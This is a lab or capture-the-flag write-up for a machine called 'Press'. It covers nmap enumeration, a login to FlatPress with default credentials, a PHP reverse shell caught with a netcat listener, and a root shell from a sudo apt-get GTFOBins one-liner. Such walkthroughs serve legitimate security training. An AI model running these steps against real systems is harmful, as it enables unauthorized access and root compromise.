##### Tags: `sudo-l`  `php`  `github`  `GTFOBin`

# 🐧Press🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.247.29

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
8089/tcp open  http    Apache httpd 2.4.56 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is a rabbit hole  
port 8089 is running a flatpress web 
use default credential admin password logged in successfully  
search github and found we can upload a php revershell  
```
https://github.com/flatpressblog/flatpress/issues/152
```
upload and execute the php file
```
$ nc -lvnp 80               
listening on [any] 80 ...

www-data@debian:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privilege Escalation

sudo -l and found we can run root with command apt-get
```
www-data@debian:/home$ sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/apt-get
```
search GTFOBin and found a way to get root shell  
https://gtfobins.org/gtfobins/apt-get/#shell    
```
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
```
www-data@debian:/tmp$sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```
